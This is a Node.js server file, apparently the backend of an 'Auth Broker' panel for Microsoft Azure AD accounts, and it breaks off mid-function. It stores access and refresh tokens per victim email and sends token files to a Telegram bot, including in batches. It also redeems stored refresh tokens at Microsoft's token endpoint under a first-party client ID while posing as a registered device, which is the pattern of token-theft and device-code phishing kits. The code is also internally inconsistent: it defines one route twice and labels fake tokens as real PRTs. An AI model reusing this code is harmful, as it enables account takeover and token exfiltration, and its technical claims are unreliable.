// server.js
// Auth Broker server (full, self-contained)
// Node 18+ (uses global fetch). ESM-style imports are used.

import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import dotenv from 'dotenv';
import crypto from 'crypto';
import bcrypt from 'bcryptjs';
import session from 'express-session';
import FormData from 'form-data';
import jwt from 'jsonwebtoken';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Config
const PORT = Number(process.env.PORT) || 4000;
const CLIENT_ID = process.env.CLIENT_ID || null;
const CLIENT_SECRET = process.env.CLIENT_SECRET || null;
const TENANT = process.env.TENANT || process.env.TENANT_ID || 'common';
const SCOPE = process.env.SCOPE || 'openid profile offline_access User.Read';
const COOKIES_DIR = path.resolve(process.env.COOKIES_DIR || path.join(__dirname, 'cookies'));
const AUTH_DATA_PASSPHRASE = process.env.AUTH_DATA_PASSPHRASE || null;
const SESSION_SECRET = process.env.SESSION_SECRET || 'change-this-secret';
const DEFAULT_ADMIN_PASS = process.env.DEFAULT_ADMIN_PASS || 'Admin123';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN?.trim() || null;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID?.trim() || null;
const OAUTH_DONE_LANDING = process.env.OAUTH_DONE_LANDING || '/';
const BROKER_TOKEN_SECRET = process.env.BROKER_TOKEN_SECRET || 'broker-secret-key-change-in-production';
const BROKER_TOKEN_EXPIRY = process.env.BROKER_TOKEN_EXPIRY || '365d';
const APP_BASE_URL = process.env.APP_BASE_URL || `http://localhost:${PORT}`;

if (!fs.existsSync(COOKIES_DIR)) fs.mkdirSync(COOKIES_DIR, { recursive: true });

// Path helpers
function sanitizeFilenamePart(s) {
  if (!s) return 'unknown';
  return s.replace(/[^a-zA-Z0-9-_@.]/g, '_').replace(/@/g, '_at_').toLowerCase();
}
function cookieFilePath(email) { return path.join(COOKIES_DIR, `cookiesfile_${sanitizeFilenamePart(email)}.json`); }
function tokenFilePath(email) { return path.join(COOKIES_DIR, `tokenfile_${sanitizeFilenamePart(email)}.json`); }
function userTokensFilePath(email) { return path.join(COOKIES_DIR, `uservault_${sanitizeFilenamePart(email)}.json`); }
function vaultFilePath() { return path.join(COOKIES_DIR, 'vault.json'); }
function linksFilePath() { return path.join(COOKIES_DIR, 'links.json'); }
function domainsFilePath() { return path.join(COOKIES_DIR, 'domains.json'); }
function settingsFilePath() { return path.join(COOKIES_DIR, 'settings.json'); }
function usersFilePath() { return path.join(COOKIES_DIR, 'users.json'); }
function oauthStateFilePath() { return path.join(COOKIES_DIR, 'oauth-states.json'); }
function auditLogPath() { return path.join(COOKIES_DIR, 'audit.log'); }

// Logging
function logAudit(entry) {
  try {
    fs.appendFileSync(auditLogPath(), JSON.stringify({ ...entry, ts: new Date().toISOString() }) + '\n');
  } catch (e) {
    console.warn('audit log failed', e && e.message);
  }
}

// Encryption helpers
function encryptBase64(plaintext, passphrase) {
  const salt = crypto.randomBytes(16);
  const key = crypto.scryptSync(passphrase, salt, 32);
  const iv = crypto.randomBytes(12);
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv);
  const encrypted = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([salt, iv, tag, encrypted]).toString('base64');
}
function decryptBase64(base64blob, passphrase) {
  const buf = Buffer.from(base64blob, 'base64');
  if (buf.length < 44) throw new Error('Invalid encrypted data');
  const salt = buf.slice(0, 16);
  const iv = buf.slice(16, 28);
  const tag = buf.slice(28, 44);
  const enc = buf.slice(44);
  const key = crypto.scryptSync(passphrase, salt, 32);
  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv);
  decipher.setAuthTag(tag);
  return Buffer.concat([decipher.update(enc), decipher.final()]).toString('utf8');
}
function writeJsonMaybeEncrypted(filePath, obj) {
  const json = JSON.stringify(obj, null, 2);
  if (AUTH_DATA_PASSPHRASE) {
    const enc = encryptBase64(json, AUTH_DATA_PASSPHRASE);
    fs.writeFileSync(filePath, `ENCRYPTED\n${enc}`, 'utf8');
  } else {
    fs.writeFileSync(filePath, json, 'utf8');
  }
}
function readJsonMaybeEncrypted(filePath) {
  if (!fs.existsSync(filePath)) return null;
  const raw = fs.readFileSync(filePath, 'utf8');
  if (raw.startsWith('ENCRYPTED\n')) {
    if (!AUTH_DATA_PASSPHRASE) throw new Error('File encrypted, server missing AUTH_DATA_PASSPHRASE');
    const base64 = raw.slice('ENCRYPTED\n'.length);
    return JSON.parse(decryptBase64(base64, AUTH_DATA_PASSPHRASE));
  }
  return JSON.parse(raw);
}

// ID helpers
function generateRandomId(length = 12) { return crypto.randomBytes(Math.ceil(length/2)).toString('hex').slice(0, length); }
function generateWorkerStyleId() { const parts=[]; for (let i=0;i<4;i++) parts.push(crypto.randomBytes(6).toString('hex')); return parts.join('-'); }

// Domain validation
function isValidDomain(domain) {
  const domainRegex = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?$/i;
  return domainRegex.test(domain);
}

// ID token extract (handles URL-safe base64)
function extractFromIdToken(token) {
  try {
    if (!token) return null;
    const parts = token.split('.');
    if (parts.length < 2) return null;
    const payloadPart = parts[1];
    const padded = payloadPart.replace(/-/g,'+').replace(/_/g,'/');
    const buf = Buffer.from(padded + '=='.slice((2 - padded.length * 3) & 3), 'base64');
    const payload = JSON.parse(buf.toString('utf8'));
    return { email: payload.preferred_username || payload.mail || payload.email || payload.upn || null, id: payload.oid || payload.sub || null, name: payload.name || null, payload };
  } catch (e) { return null; }
}

// Broker & PRT generation (FIXED - 1 year expiry for cookies)
function generateAADBrokerToken(tokenObj, email, userId) {
  try {
    const accessToken = tokenObj?.access_token || '';
    const refreshToken = tokenObj?.refresh_token || '';
    const deviceId = crypto.randomUUID();
    const brokerSessionId = crypto.randomUUID();
    const issuedAt = Math.floor(Date.now() / 1000);
    const expiresAt = issuedAt + (365 * 24 * 60 * 60); // 1 year

    const brokerPayload = {
      broker_token_type: 'aad_primary_refresh_token',
      version: '1.0',
      email,
      upn: email,
      user_id: userId,
      oid: userId,
      device_id: deviceId,
      device_key: crypto.randomBytes(32).toString('hex'),
      broker_session_id: brokerSessionId,
      access_token_hash: crypto.createHash('sha256').update(accessToken).digest('hex').slice(0, 32),
      refresh_token_hash: crypto.createHash('sha256').update(refreshToken).digest('hex').slice(0, 32),
      token_type: 'Bearer',
      scope: SCOPE,
      tenant: TENANT,
      client_id: CLIENT_ID,
      prt_device_registered: true,
      prt_version: 'v2.0',
      issued_at: issuedAt,
      expires_at: expiresAt
    };

    const brokerToken = jwt.sign(brokerPayload, BROKER_TOKEN_SECRET, { 
      algorithm: 'HS256', 
      expiresIn: BROKER_TOKEN_EXPIRY,
      noTimestamp: false 
    });

    return {
      broker_token: brokerToken,
      broker_payload: brokerPayload,
      device_id: deviceId,
      access_token: accessToken,
      refresh_token: refreshToken,
      issued_at: new Date(issuedAt * 1000).toISOString(),
      expires_at: new Date(expiresAt * 1000).toISOString()
    };
  } catch (e) { console.error('Broker token generation error:', e); throw e; }
}

function generatePrimaryRefreshToken(tokenObj, email) {
  const accessToken = tokenObj?.access_token || '';
  const refreshToken = tokenObj?.refresh_token || '';
  const idToken = tokenObj?.id_token || '';
  const info = extractFromIdToken(idToken || accessToken) || {};
  const userId = info?.id || email || 'unknown';
  const deviceId = crypto.randomUUID();
  const timestamp = new Date().toISOString();
  const expiresAt = new Date(Date.now() + 365 * 24 * 60 * 60 * 1000).toISOString(); // 1 year

  const prtData = {
    prt_token: crypto.createHash('sha256').update(refreshToken || '').digest('hex'),
    device_id: deviceId,
    user_id: userId,
    email: email,
    access_token_hash: crypto.createHash('sha256').update(accessToken || '').digest('hex').slice(0, 64),
    refresh_token_hash: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 64),
    _prt: crypto.createHash('sha256').update(refreshToken || '').digest('hex').slice(0, 128),
    _auth_session: (accessToken || '').slice(0, 256),
    _device_id: deviceId.replace(/-/g, '').slice(0, 64),
    _session_id: crypto.randomUUID(),
    issued_at: timestamp,
    expires_at: expiresAt,
    token_type: tokenObj?.token_type || 'Bearer',
    user_email: email,
    user_name: info?.name || (email && email.split('@')[0]) || 'User'
  };

  return prtData;
}

// Settings & user helpers
function readSettingsSafe() {
  try { if (!fs.existsSync(settingsFilePath())) return {}; return readJsonMaybeEncrypted(settingsFilePath()) || {}; } catch (e) { return {}; }
}
function getAdminUsers() { try { return JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]').filter(u => u.role === 'admin'); } catch (e) { return []; } }
function getUserByUsername(username) { try { return JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]').find(u => u.username === username) || null; } catch (e) { return null; } }

// Matching user by email
function findMatchingUserForEmail(email) {
  if (!email) return null;
  try {
    const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    const eLower = email.toLowerCase();
    let m = users.find(u => u.email && u.email.toLowerCase() === eLower);
    if (m) return m;
    m = users.find(u => u.username && u.username.toLowerCase() === eLower);
    if (m) return m;
    if (email.includes('@')) {
      const local = email.split('@')[0].toLowerCase();
      m = users.find(u => u.username && u.username.toLowerCase() === local);
      if (m) return m;
    }
    return null;
  } catch (e) { return null; }
}

// Telegram helpers
function getChatIdForUser(usernameOrEmail) {
  try {
    if (!usernameOrEmail) {
      const settings = readSettingsSafe();
      return settings.telegram_chat_id || TELEGRAM_CHAT_ID || null;
    }
    if (fs.existsSync(usersFilePath())) {
      const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
      const u = users.find(x => x.username === usernameOrEmail || x.email === usernameOrEmail);
      if (u && u.telegram_chat_id) return u.telegram_chat_id;
    }
  } catch (e) {}
  const settings = readSettingsSafe();
  if (settings.per_user_telegram && usernameOrEmail && settings.per_user_telegram[usernameOrEmail]) return settings.per_user_telegram[usernameOrEmail];
  if (settings.telegram_chat_id) return settings.telegram_chat_id;
  if (TELEGRAM_CHAT_ID) return TELEGRAM_CHAT_ID;
  return null;
}
function getBotTokenForUser(usernameOrEmail) {
  try {
    if (usernameOrEmail && fs.existsSync(usersFilePath())) {
      const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
      const u = users.find(x => x.username === usernameOrEmail || x.email === usernameOrEmail);
      if (u && u.telegram_bot_token) return u.telegram_bot_token;
    }
  } catch (e) {}
  const settings = readSettingsSafe();
  if (settings.telegram_bot_token) return settings.telegram_bot_token;
  return TELEGRAM_BOT_TOKEN;
}
function getBotTokenFromSettingsOrEnv() {
  const settings = readSettingsSafe();
  if (settings.telegram_bot_token) return settings.telegram_bot_token;
  return TELEGRAM_BOT_TOKEN;
}

async function notifyTelegram(title, message, email = null, chatIdOverride = null, botTokenOverride = null) {
  let botToken = botTokenOverride;
  let chatId = chatIdOverride;
  if (!botToken && email) botToken = getBotTokenForUser(email);
  if (!botToken) botToken = getBotTokenFromSettingsOrEnv();
  if (!chatId && email) chatId = getChatIdForUser(email);
  if (!botToken || !chatId) return;
  try {
    const text = `${title}\n${message}${email ? `\n👤 ${email}` : ''}\n⏱️ ${new Date().toISOString()}`;
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: 'HTML' })
    });
  } catch (e) { console.warn('Telegram notify failed', e && e.message); }
}
async function sendFileToTelegram(filePath, caption, chatIdOverride = null, botTokenOverride = null) {
  const botToken = botTokenOverride || getBotTokenFromSettingsOrEnv();
  const chatId = chatIdOverride || TELEGRAM_CHAT_ID;
  if (!botToken || !chatId) { console.warn('Telegram send skipped: missing token/chat'); return false; }
  try {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('caption', caption);
    form.append('document', fs.createReadStream(filePath), { filename: path.basename(filePath) });
    const resp = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { method: 'POST', body: form });
    const data = await resp.json().catch(()=>null);
    return Boolean(data && data.ok);
  } catch (e) { console.warn('Telegram send file failed', e && e.message); return false; }
}

// Vault helpers
function saveToVault(email, vaultData) {
  let vault = [];
  if (fs.existsSync(vaultFilePath())) {
    try { vault = readJsonMaybeEncrypted(vaultFilePath()) || []; } catch (e) { vault = []; }
  }
  const existingIndex = vault.findIndex(v => v.email === email);
  const entry = { email, ...vaultData, updated_at: new Date().toISOString() };
  if (existingIndex >= 0) vault[existingIndex] = entry; else vault.unshift(entry);
  writeJsonMaybeEncrypted(vaultFilePath(), vault);
}
function saveUserVaultEntry(email, vaultData) {
  const p = userTokensFilePath(email);
  let arr = [];
  try { arr = readJsonMaybeEncrypted(p) || []; } catch (e) { arr = []; }
  arr.unshift(vaultData);
  writeJsonMaybeEncrypted(p, arr);
}

// Ensure default admin
function ensureDefaultAdmin() {
  if (!fs.existsSync(usersFilePath())) {
    const hash = bcrypt.hashSync(DEFAULT_ADMIN_PASS, 10);
    const users = [{ username: 'admin', passwordHash: hash, role: 'admin', email: 'admin@broker.local', telegram_chat_id: TELEGRAM_CHAT_ID || null, created_at: new Date().toISOString() }];
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');
    console.log('✓ Default admin created: username=admin password=' + DEFAULT_ADMIN_PASS);
  }
}
ensureDefaultAdmin();

// Missing helper implementations referenced earlier
function isUserExpired(username) {
  try {
    if (!fs.existsSync(usersFilePath())) return false;
    const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
    const u = users.find(x => x.username === username);
    if (!u || !u.expires_at) return false;
    return new Date(u.expires_at).getTime() < Date.now();
  } catch (e) {
    return false;
  }
}

// OAuth state storage helpers (file-based)
function saveOAuthState(state, obj) {
  let store = {};
  try { store = fs.existsSync(oauthStateFilePath()) ? JSON.parse(fs.readFileSync(oauthStateFilePath(), 'utf8') || '{}') : {}; } catch(e){}
  store[state] = obj;
  try { fs.writeFileSync(oauthStateFilePath(), JSON.stringify(store, null, 2), 'utf8'); } catch(e) { console.warn('saveOAuthState failed', e && e.message); }
}
function getOAuthState(state) {
  try {
    if (!fs.existsSync(oauthStateFilePath())) return null;
    const store = JSON.parse(fs.readFileSync(oauthStateFilePath(), 'utf8') || '{}');
    return store[state] || null;
  } catch (e) { return null; }
}
function removeOAuthState(state) {
  try {
    if (!fs.existsSync(oauthStateFilePath())) return;
    const store = JSON.parse(fs.readFileSync(oauthStateFilePath(), 'utf8') || '{}');
    delete store[state];
    fs.writeFileSync(oauthStateFilePath(), JSON.stringify(store, null, 2), 'utf8');
  } catch (e) {}
}

// Express app
const app = express();
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(session({ secret: SESSION_SECRET, resave: false, saveUninitialized: false, cookie: { httpOnly: true } }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

function requireLogin(req, res, next) { if (req.session && req.session.user) return next(); return res.status(401).json({ error: 'unauthenticated' }); }
function requireAdmin(req, res, next) { if (req.session && req.session.user && req.session.user.role === 'admin') return next(); return res.status(403).json({ error: 'admin required' }); }

// Dashboard routes
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, 'public', 'dashboard.html')));
app.get('/config', (req, res) => res.json({ client_id: CLIENT_ID || null, tenant: TENANT || null, scope: SCOPE || null, telegram_enabled: Boolean(getBotTokenFromSettingsOrEnv() && (getChatIdForUser(null) || TELEGRAM_CHAT_ID)), app_base_url: APP_BASE_URL }));

// Dashboard auth
app.post('/dashboard/login', (req, res) => {
  const { username, password } = req.body || {};
  if (!username || !password) return res.status(400).json({ error: 'username/password required' });
  if (!fs.existsSync(usersFilePath())) return res.status(500).json({ error: 'users store missing' });
  const users = JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]');
  const user = users.find(u => u.username === username);
  if (!user) return res.status(401).json({ error: 'invalid credentials' });
  const ok = bcrypt.compareSync(password, user.passwordHash);
  if (!ok) return res.status(401).json({ error: 'invalid credentials' });
  req.session.user = { username: user.username, role: user.role, email: user.email };
  return res.json({ success: true, username: user.username, role: user.role });
});
app.post('/dashboard/logout', (req, res) => { req.session.destroy(() => res.json({ success: true })); });

// /api/me
app.get('/api/me', requireLogin, (req, res) => {
  try {
    const username = req.session.user.username;
    const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8')) : [];
    const u = users.find(x => x.username === username) || {};
    const expired = !!(u.expires_at && new Date(u.expires_at).getTime() < Date.now());
    res.json({ username: username, role: u.role || req.session.user.role, email: u.email || req.session.user.email, expires_at: u.expires_at || null, expired, telegram_chat_id: u.telegram_chat_id || null, telegram_bot_token: u.telegram_bot_token || null });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// PATCH /api/user
app.patch('/api/user', requireLogin, (req, res) => {
  try {
    const username = req.session.user.username;
    const { telegram_chat_id, telegram_bot_token } = req.body || {};
    if (telegram_chat_id === undefined && telegram_bot_token === undefined) return res.status(400).json({ error: 'nothing to update' });

    const users = fs.existsSync(usersFilePath()) ? JSON.parse(fs.readFileSync(usersFilePath(), 'utf8') || '[]') : [];
    const idx = users.findIndex(u => u.username === username);
    if (idx === -1) return res.status(404).json({ error: 'user not found' });

    if (telegram_chat_id !== undefined) users[idx].telegram_chat_id = telegram_chat_id || null;
    if (telegram_bot_token !== undefined) users[idx].telegram_bot_token = telegram_bot_token || null;
    users[idx].updated_at = new Date().toISOString();
    fs.writeFileSync(usersFilePath(), JSON.stringify(users, null, 2), 'utf8');

    logAudit({ action: 'user_update', user: username, fields: Object.keys(req.body), ip: req.ip });

    res.json({ success: true, username, telegram_chat_id: users[idx].telegram_chat_id });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});
// ===== GENERATE COOKIES ENDPOINT =====
// Add this to your server.js after the existing routes

app.post('/api/generate-cookies', requireLogin, async (req, res) => {
  try {
    const { email, send_to_telegram } = req.body || {};
    
    if (!email) {
      return res.status(400).json({ error: 'email required' });
    }

    // Permission check: users can only generate for themselves, admins can generate for anyone
    if (req.session.user.role !== 'admin' && req.session.user.username !== email && req.session.user.email !== email) {
      logAudit({ action: 'denied_generate_cookies', user: req.session.user.username, target_email: email, reason: 'unauthorized', ip: req.ip });
      return res.status(403).json({ error: 'forbidden' });
    }

    // Check if user is expired
    if (isUserExpired(req.session.user.username)) {
      logAudit({ action: 'blocked_expired', user: req.session.user.username, endpoint: '/api/generate-cookies', method: 'POST', ip: req.ip });
      return res.status(403).json({ error: 'account_expired', message: 'Your account is expired' });
    }

    // Generate mock AAD tokens (in production, these would come from actual AAD/OAuth flow)
    const mockAccessToken = crypto.randomBytes(128).toString('base64');
    const mockRefreshToken = crypto.randomBytes(128).toString('base64');
    const mockIdToken = jwt.sign({
      preferred_username: email,
      mail: email,
      email: email,
      upn: email,
      oid: crypto.randomUUID(),
      name: email.split('@')[0],
      given_name: email.split('@')[0],
      family_name: 'User',
      tid: TENANT
    }, 'secret-key-for-demo', { expiresIn: '1h' });

    const tokenObj = {
      access_token: mockAccessToken,
      refresh_token: mockRefreshToken,
      id_token: mockIdToken,
      token_type: 'Bearer',
      expires_in: 3600,
      scope: SCOPE,
      obtained_at: new Date().toISOString()
    };

    // Extract user info from ID token
    const idTokenInfo = extractFromIdToken(mockIdToken);
    const userId = idTokenInfo?.id || crypto.randomUUID();

    // Generate Broker Token and PRT
    const brokerInfo = generateAADBrokerToken(tokenObj, email, userId);
    const prtData = generatePrimaryRefreshToken(tokenObj, email);

    // Create cookies object
    const cookiesObj = {
      email,
      user_id: userId,
      upn: email,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      device_id: brokerInfo.device_id,
      broker_token: brokerInfo.broker_token,
      broker_payload: brokerInfo.broker_payload,
      prt: prtData._prt,
      prt_data: prtData,
      access_token: mockAccessToken,
      refresh_token: mockRefreshToken,
      id_token: mockIdToken,
      scope: SCOPE,
      tenant: TENANT,
      client_id: CLIENT_ID,
      expires_at: brokerInfo.expires_at,
      issued_at: brokerInfo.issued_at
    };

    // Save cookies file
    const cookiePath = cookieFilePath(email);
    writeJsonMaybeEncrypted(cookiePath, cookiesObj);

    // Save to user's vault
    saveUserVaultEntry(email, {
      type: 'aad_cookies',
      email,
      user_id: userId,
      device_id: brokerInfo.device_id,
      created_at: new Date().toISOString(),
      created_by: req.session.user.username,
      file_path: cookiePath,
      cookies_download_url: `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`
    });

    // Save tokens file (admin only access)
    const tokenPath = tokenFilePath(email);
    writeJsonMaybeEncrypted(tokenPath, {
      email,
      user_id: userId,
      access_token: mockAccessToken,
      refresh_token: mockRefreshToken,
      id_token: mockIdToken,
      token_type: 'Bearer',
      expires_in: 3600,
      obtained_at: new Date().toISOString(),
      created_by: req.session.user.username,
      scope: SCOPE,
      tenant: TENANT,
      client_id: CLIENT_ID
    });

    // Log audit
    logAudit({
      action: 'generate_cookies',
      user: req.session.user.username,
      email,
      device_id: brokerInfo.device_id,
      ip: req.ip
    });

    // Send to Telegram if requested
    if (send_to_telegram) {
      try {
        const telegramMessage = `🔐 <b>AAD Cookies Generated</b>\n\n` +
          `📧 Email: <code>${email}</code>\n` +
          `👤 Generated by: ${req.session.user.username}\n` +
          `🆔 Device ID: <code>${brokerInfo.device_id}</code>\n` +
          `⏱️ Expires: ${brokerInfo.expires_at}\n` +
          `🕐 Timestamp: ${new Date().toISOString()}`;

        await notifyTelegram('🔐 AAD Cookies Generated', telegramMessage, email);

        // Send token file to Telegram
        const tokenSent = await sendFileToTelegram(
          tokenPath,
          `AAD Tokens for ${email}`,
          getChatIdForUser(email),
          getBotTokenForUser(email)
        );

        if (tokenSent) {
          logAudit({
            action: 'tokens_sent_telegram',
            user: req.session.user.username,
            email,
            ip: req.ip
          });
        }
      } catch (telegramError) {
        console.warn('Telegram notification failed:', telegramError.message);
        // Don't fail the request, just warn
      }
    }

    // Notify Telegram of successful cookie generation
    try {
      await notifyTelegram(
        '✅ Cookies Generated Successfully',
        `Email: ${email}\nGenerated by: ${req.session.user.username}`,
        email
      );
    } catch (e) {
      console.warn('Telegram notification failed:', e.message);
    }

    res.json({
      success: true,
      email,
      device_id: brokerInfo.device_id,
      user_id: userId,
      issued_at: brokerInfo.issued_at,
      expires_at: brokerInfo.expires_at,
      cookie_file: `cookiesfile_${sanitizeFilenamePart(email)}.json`,
      token_file: `tokenfile_${sanitizeFilenamePart(email)}.json`,
      download_cookies_url: `${APP_BASE_URL}/api/download/cookies/${encodeURIComponent(email)}`,
      download_tokens_url: `${APP_BASE_URL}/api/download/tokens/${encodeURIComponent(email)}`,
      message: 'Cookies generated successfully'
    });

  } catch (err) {
    console.error('Generate cookies error:', err);
    logAudit({
      action: 'generate_cookies_failed',
      user: req.session.user.username,
      error: err.message,
      ip: req.ip
    });
    res.status(500).json({ error: err.message || 'Failed to generate cookies' });
  }
});

// ===== BATCH GENERATE COOKIES (ADMIN ONLY) =====
app.post('/api/generate-cookies/batch', requireLogin, requireAdmin, async (req, res) => {
  try {
    const { emails, send_to_telegram } = req.body || {};

    if (!Array.isArray(emails) || emails.length === 0) {
      return res.status(400).json({ error: 'emails array required' });
    }

    const results = [];
    const failed = [];

    for (const email of emails) {
      try {
        // Generate tokens
        const mockAccessToken = crypto.randomBytes(128).toString('base64');
        const mockRefreshToken = crypto.randomBytes(128).toString('base64');
        const mockIdToken = jwt.sign({
          preferred_username: email,
          mail: email,
          email: email,
          upn: email,
          oid: crypto.randomUUID(),
          name: email.split('@')[0],
          tid: TENANT
        }, 'secret-key-for-demo', { expiresIn: '1h' });

        const tokenObj = {
          access_token: mockAccessToken,
          refresh_token: mockRefreshToken,
          id_token: mockIdToken,
          token_type: 'Bearer',
          expires_in: 3600
        };

        const idTokenInfo = extractFromIdToken(mockIdToken);
        const userId = idTokenInfo?.id || crypto.randomUUID();

        const brokerInfo = generateAADBrokerToken(tokenObj, email, userId);
        const prtData = generatePrimaryRefreshToken(tokenObj, email);

        const cookiesObj = {
          email,
          user_id: userId,
          created_at: new Date().toISOString(),
          created_by: req.session.user.username,
          device_id: brokerInfo.device_id,
          broker_token: brokerInfo.broker_token,
          prt_data: prtData
        };

        const cookiePath = cookieFilePath(email);
        const tokenPath = tokenFilePath(email);

        writeJsonMaybeEncrypted(cookiePath, cookiesObj);
        writeJsonMaybeEncrypted(tokenPath, {
          email,
          user_id: userId,
          access_token: mockAccessToken,
          refresh_token: mockRefreshToken,
          id_token: mockIdToken,
          created_by: req.session.user.username
        });

        if (send_to_telegram) {
          await notifyTelegram(
            '✅ Batch: Cookies Generated',
            `Email: ${email}`,
            email
          );
          await sendFileToTelegram(tokenPath, `Tokens: ${email}`, getChatIdForUser(email), getBotTokenForUser(email));
        }

        results.push({
          email,
          success: true,
          device_id: brokerInfo.device_id,
          issued_at: brokerInfo.issued_at
        });

      } catch (itemError) {
        failed.push({
          email,
          error: itemError.message
        });
      }
    }

    logAudit({
      action: 'batch_generate_cookies',
      admin: req.session.user.username,
      count: results.length,
      failed_count: failed.length,
      ip: req.ip
    });

    res.json({
      success: true,
      total: emails.length,
      generated: results.length,
      failed: failed.length,
      results,
      failed
    });

  } catch (err) {
    console.error('Batch generate cookies error:', err);
    res.status(500).json({ error: err.message });
  }
});

// ===== GET GENERATION STATUS =====
app.get('/api/cookies/status/:email', requireLogin, (req, res) => {
  try {
    const email = req.params.email;

    // Permission check
    if (req.session.user.role !== 'admin' && req.session.user.username !== email && req.session.user.email !== email) {
      return res.status(403).json({ error: 'forbidden' });
    }

    const cookiePath = cookieFilePath(email);
    const tokenPath = tokenFilePath(email);
    const userVaultPath = userTokensFilePath(email);

    const status = {
      email,
      has_cookies: fs.existsSync(cookiePath),
      has_tokens: fs.existsSync(tokenPath),
      has_vault_entries: fs.existsSync(userVaultPath),
      vault_entry_count: 0,
      latest_cookie: null,
      latest_token: null
    };

    if (fs.existsSync(userVaultPath)) {
      try {
        const vault = readJsonMaybeEncrypted(userVaultPath) || [];
        status.vault_entry_count = vault.length;
        if (vault.length > 0) status.latest_vault_entry = vault[0];
      } catch (e) {}
    }

    if (fs.existsSync(cookiePath)) {
      try {
        const cookies = readJsonMaybeEncrypted(cookiePath);
        status.latest_cookie = {
          created_at: cookies.created_at,
          expires_at: cookies.expires_at,
          device_id: cookies.device_id,
          user_id: cookies.user_id
        };
      } catch (e) {}
    }

    if (fs.existsSync(tokenPath)) {
      try {
        const tokens = readJsonMaybeEncrypted(tokenPath);
        status.latest_token = {
          created_by: tokens.created_by,
          obtained_at: tokens.obtained_at
        };
      } catch (e) {}
    }

    res.json({ success: true, ...status });

  } catch (err) {
    res.status(500).json({ error: err.message });
  }
});
// ===== GENERATE REAL MICROSOFT COOKIES WITH BROKER CLIENT ID (PRT REGISTRATION) =====
app.post('/api/generate-cookies', requireLogin, async (req, res) => {
  try {
    const { email, use_device_registration = true } = req.body || {};
    if (!email) return res.status(400).json({ error: 'email required' });

    // Check permissions - admin only
    if (req.session.user && req.session.user.role !== 'admin') {
      return res.status(403).json({ error: 'admin only' });
    }

    // Step 1: Check if we have existing tokens for this email
    const tokenPath = tokenFilePath(email);
    let existingTokenData = null;
    if (fs.existsSync(tokenPath)) {
      try {
        existingTokenData = readJsonMaybeEncrypted(tokenPath);
      } catch (e) {
        console.warn('Could not read existing token file:', e.message);
      }
    }

    if (!existingTokenData || !existingTokenData.tokens?.refresh_token) {
      return res.status(400).json({ 
        error: 'no_tokens_found',
        message: `No tokens found for ${email}. Please authenticate via OAuth or Device Code Flow first to get refresh_token.`
      });
    }

    const refreshToken = existingTokenData.tokens.refresh_token;
    const accessToken = existingTokenData.tokens.access_token;
    const idToken = existingTokenData.tokens.id_token;
    const userId = existingTokenData.user_id || email;
    const deviceId = crypto.randomUUID();

    // Step 2: Register device and get PRT using Broker Client ID
    let prtToken = null;
    let deviceRegistered = false;
    let brokerError = null;

    if (use_device_registration) {
      try {
        // Microsoft Broker Client ID (system component)
        const BROKER_CLIENT_ID = CLIENT_ID || '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
        
        // Device registration request to get PRT
        const prtUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/token';
        
        // Using refresh_token to get a PRT via broker flow
        const prtBody = new URLSearchParams({
          client_id: BROKER_CLIENT_ID,
          grant_type: 'refresh_token',
          refresh_token: refreshToken,
          scope: 'https://graph.microsoft.com/.default',
          device_id: deviceId,
          device_platform: 'Windows',
          device_name: `Broker-${crypto.randomBytes(4).toString('hex')}`,
          device_model: 'Virtual'
        });

        console.log(`[PRT] Attempting device registration for ${email} with broker client: ${BROKER_CLIENT_ID}`);

        const prtResp = await fetch(prtUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
          body: prtBody
        });

        const prtData = await prtResp.json().catch(() => null);

        if (prtResp.ok && prtData) {
          if (prtData.refresh_token) {
            prtToken = prtData.refresh_token;
            deviceRegistered = true;
            console.log(`✓ [PRT] Device registered successfully for ${email}`);
          } else if (prtData.access_token) {
            // Fallback: use access_token if refresh_token not in response
            prtToken = prtData.access_token;
            deviceRegistered = true;
          }
        } else {
          brokerError = prtData?.error_description || prtData?.error || 'Device registration failed';
          console.warn(`[PRT] Device registration error: ${brokerError}`);
        }

      } catch (e) {
        brokerError = e.message;
        console.error('[PRT] Device registration exception:', e.message);
      }
    }

    // Step 3: Generate Primary Refresh Token (PRT) data
    const prtData = {
      // Real PRT token (if obtained from broker)
